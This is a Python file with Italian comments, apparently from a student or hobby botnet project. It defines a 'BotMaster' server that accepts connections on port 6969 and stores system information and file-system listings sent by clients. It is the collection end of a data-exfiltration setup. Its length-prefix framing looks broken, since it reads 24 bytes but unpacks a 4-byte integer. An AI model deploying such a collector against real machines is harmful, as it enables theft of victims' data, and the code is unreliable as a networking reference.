# Questo file rappresenta il server, il BotMaster.
import json
import socket
import pprint
import struct

pp = pprint.PrettyPrinter(indent=4)

PORT = 6969
SERVER = socket.gethostbyname(socket.gethostname())
FORMAT = 'utf-8'
SUCCESSFUL_RESPONSE = 'ok'


class BotMaster:
    def __init__(self):
        self.serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_STREAM indica l'utilizzo di una socket TCP.
        self.start()

    def __del__(self):
        self.serverSocket.close()

    def start(self):
        """
        Procedura tramite la quale il server, una volta attivato, resta in attesa di connessione con il client.
        :return: None
        """
        self.serverSocket.bind(('', PORT))
        self.serverSocket.listen()
        print('The server is ready to receive!')
        self.waitForClient()


    def waitForHeader(self, connection):
        """
        Procedura nella quale il server riceve la dimensione dell'header del pacchetto che conterrà dati rilevanti.
        :return: None
        """

        # Il client invia al server la dimensione dei dati raccolti ( da sostituire poi al parametro HEADER per la recv() ).
        data_dim = 0
        while data_dim == 0:
            data_dim = int(connection.recv(1024).decode(FORMAT))

        # Il server manderà una riposta al client per confermare la corretta ricevuta della dimensione dei dati.
        message_received = SUCCESSFUL_RESPONSE
        # Comunica direttamente sulla socket del client.
        connection.sendall(message_received.encode(FORMAT))

        print("System Information Header dimension received: ", data_dim)

        return data_dim

    def waitForClient(self):
        """
        Procedura tramite la quale il server accetta la richiesta di connessione del client e salva i dati ricevuti in un file .json.
        :return: None
        """
        while True:
            connection, addr = self.serverSocket.accept()
            print('The connection has been accepted! Client ip address: ', addr[0])

            data_dim = self.waitForHeader(connection)
            print("data dimension= " + str(data_dim))
            #data = connection.recv(data_dim).decode(FORMAT)

            data = self.recv_msg(connection).decode(FORMAT)

            print(data.strip())
            dict = json.loads(data)
            pp.pprint(dict) # Stampa di ciò che verrà riportato nel file .json

            with open('data.json', 'w') as fp:
                json.dump(dict, fp, indent=4)

            # Il server aspetta il secondo header, quello relativo al retrieval del file system.
            data_dim = self.waitForHeader(connection)

            data = connection.recv(data_dim).decode(FORMAT)
            with open('fileSystem.txt', 'w', encoding="utf-8") as fp:
                fp.write(data)

            connection.close()


    def recv_msg(self, conn):
        raw_msglen = self.recvall(conn, 24)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        data = bytearray()
        while len(data) < n:
            packet = conn.recv(n - len((data)))
            if not packet:
                return None
            data.extend(packet)
        return data



if __name__ == '__main__':
    server = BotMaster()
